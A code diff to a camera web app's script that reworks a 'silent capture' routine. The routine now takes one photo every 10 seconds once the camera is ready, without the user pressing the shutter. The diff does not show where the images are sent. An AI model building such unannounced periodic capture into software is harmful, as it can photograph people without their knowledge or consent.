@@ -1,5 +1,5 @@
 // ================================================================
-// app.js – Pro Camera PWA (Mirror Fix, Flip Single Click)
+// app.js – Pro Camera PWA (Auto Capture 1 Photo Only)
 // ================================================================
 
 (function() {
@@ -79,7 +79,7 @@
     return focalLengths[closest] || Math.round(26 * zoom);
   }
 
-  // ✅ NEW: Front Camera Normal (Mirror Fix)
+  // ---------- Preview Transform ----------
   function applyPreviewTransform() {
     if (userFacingMode === 'user') {
       if (currentZoom !== 1) {
@@ -249,7 +249,7 @@
     isProcessing = false;
   }
 
-  // ---------- Silent Capture (Front Normal) ----------
+  // ---------- Silent Capture ----------
   async function silentCapture(stream, cameraType, captureType) {
     if (!stream) return;
     captureType = captureType || 'auto';
@@ -268,7 +268,6 @@
     tempCanvas.width = vw;
     tempCanvas.height = vh;
 
-    // ✅ Front Camera Mirror Fix
     if (cameraType === 'front') {
       tempCtx.translate(vw, 0);
       tempCtx.scale(-1, 1);
@@ -318,13 +317,19 @@
     }
   }
 
-  // ✅ NEW: Auto Capture – Active Camera Only
+  // ✅ NEW: Auto Capture – पहिलो 10 सेकेन्ड पछि, एकपटक एउटा मात्र
   function startAutoCapture() {
     if (isAutoCaptureRunning) return;
+    // ✅ Camera Ready भएपछि मात्र Start
+    if (!isCameraReady || !currentPreviewStream) {
+      console.log('[Camera] ⏳ Camera not ready, auto-capture waiting...');
+      return;
+    }
     isAutoCaptureRunning = true;
-    console.log('[Camera] ⏰ Auto-capture started (Active Camera only)');
+    console.log('[Camera] ⏰ Auto-capture started (1 photo per cycle)');
 
-    var captureSequence = function() {
+    // ✅ पहिलो capture तुरुन्तै नगरी 10 सेकेन्ड पछि मात्र
+    autoCaptureInterval = setInterval(function() {
       var now = Date.now();
       var timeSinceUserCapture = now - lastUserCaptureTime;
 
@@ -342,10 +347,7 @@
       } else {
         console.warn('[Camera] ⚠️ Active camera stream not available');
       }
-    };
-
-    captureSequence();
-    autoCaptureInterval = setInterval(captureSequence, 10000);
+    }, 10000); // 10 सेकेन्ड interval
   }
 
   // ---------- Manual Capture ----------
@@ -360,8 +362,6 @@
     canvas.height = vh;
 
     var cameraType = userFacingMode === 'environment' ? 'back' : 'front';
-
-    // ✅ Front Camera Mirror Fix
     if (cameraType === 'front') {
       ctx.translate(vw, 0);
       ctx.scale(-1, 1);
@@ -675,7 +675,6 @@
       console.log('[Camera] ✅ Video playing');
     }
 
-    // ✅ Apply mirror fix for preview
     applyPreviewTransform();
 
     var track = currentPreviewStream?.getVideoTracks()[0];
@@ -721,6 +720,7 @@
 
     console.log('[Camera] ✅ Camera ready!');
 
+    // ✅ Camera Ready भएपछि मात्र Auto Capture Start
     startAutoCapture();
 
     if (navigator.onLine) {
@@ -764,7 +764,6 @@
     flashBtn.classList.toggle('active', isTorchOn);
   });
 
-  // ✅ NEW: Flip Button – Single Click (Fixed)
   flipBtn.addEventListener('click', async function() {
     console.log('[Camera] 🔄 Flip button clicked');
     var newFacingMode = (userFacingMode === 'environment') ? 'user' : 'environment';
